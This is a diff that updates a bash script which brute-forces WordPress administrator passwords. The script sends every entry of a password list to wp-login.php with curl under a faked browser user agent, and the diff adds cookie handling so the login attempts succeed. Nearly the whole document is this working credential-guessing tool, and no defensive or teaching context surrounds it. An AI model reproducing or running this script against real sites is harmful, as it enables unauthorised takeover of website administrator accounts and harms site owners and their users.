@@ -9,8 +9,12 @@
 # --------------------------------------------------------------------------------
 #
 
+# v.1.1
+
 USER_AGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
 TIMEOUT=1
+COOKIE=cookie-`date +%s`
+COOKIE_PATH="/tmp/$COOKIE"
 
 # Get arguments
 args_array=( $@ )
@@ -32,10 +36,14 @@ else
 fi
 
 # Start
+curl -s -A "$USER_AGENT" -c "$COOKIE_PATH" $WP_URL/wp-login > /dev/null
 cat "$WP_PASSWORD" | while read line;
 	do {
-		REQ=`curl --silent -A "$USER_AGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="$WP_URL/wp-admin" -d testcookie=1 $WP_URL/wp-login.php`
+		echo $line
+		REQ=`curl -s -b "$COOKIE_PATH" -A "$USER_AGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="$WP_URL/wp-admin" -d testcookie=1 $WP_URL/wp-login.php`
 
-		if [ "$REQ" == "" ]; then echo "The password is: $line"; exit; fi
+		if [ "$REQ" == "" ]; then echo "The password is: $line"; rm "$COOKIE_PATH"; exit; fi
 	}
 	done
+
+rm "$COOKIE_PATH" 2> /dev/null
